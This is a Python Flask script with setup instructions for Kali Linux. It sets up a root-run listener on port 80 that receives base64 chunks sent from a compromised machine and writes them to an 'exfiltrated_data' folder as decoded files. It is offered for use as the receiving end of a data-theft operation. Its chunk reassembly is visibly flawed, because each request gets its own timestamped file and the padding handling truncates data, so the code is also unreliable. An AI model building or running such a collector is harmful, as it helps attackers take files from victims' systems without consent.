"""
Python HTTP Server for POST Handling using FLASK on "Kali" linux

00- Insert the Python Code on the "flask_server.py"
01- apt update && apt upgrade -y && pip install flask
02- sudo python3 flask_server.py
"""
from flask import Flask, request
import base64
import os
from datetime import datetime

app = Flask(__name__)

# Configuration
OUTPUT_FOLDER = "exfiltrated_data"
os.makedirs(OUTPUT_FOLDER, exist_ok=True)

@app.route('/', methods=['POST'])
def handle_post():
    if not request.data:
        return "No data received", 400
    
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    encoded_file = os.path.join(OUTPUT_FOLDER, f"exfil_{timestamp}.b64")
    decoded_file = os.path.join(OUTPUT_FOLDER, f"original_{timestamp}")
    
    try:
        # Append received chunk to base64 file
        with open(encoded_file, 'ab') as f:
            f.write(request.data)
        
        # Try to decode after each chunk (in case transfer is interrupted)
        with open(encoded_file, 'rb') as f_encoded:
            encoded_data = f_encoded.read()
        
        # Remove padding if incomplete
        encoded_data_clean = encoded_data.split(b'==')[0] + b'==' if b'==' in encoded_data else encoded_data
        
        with open(decoded_file, 'wb') as f_decoded:
            try:
                decoded_data = base64.b64decode(encoded_data_clean, validate=True)
                f_decoded.write(decoded_data)
                status = f"Successfully decoded {len(decoded_data)} bytes"
            except base64.binascii.Error:
                status = "Received chunk (not yet complete base64)"
        
        return f"Chunk received ({len(request.data)} bytes). {status}", 200
    
    except Exception as e:
        return f"Error: {str(e)}", 500

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=80)
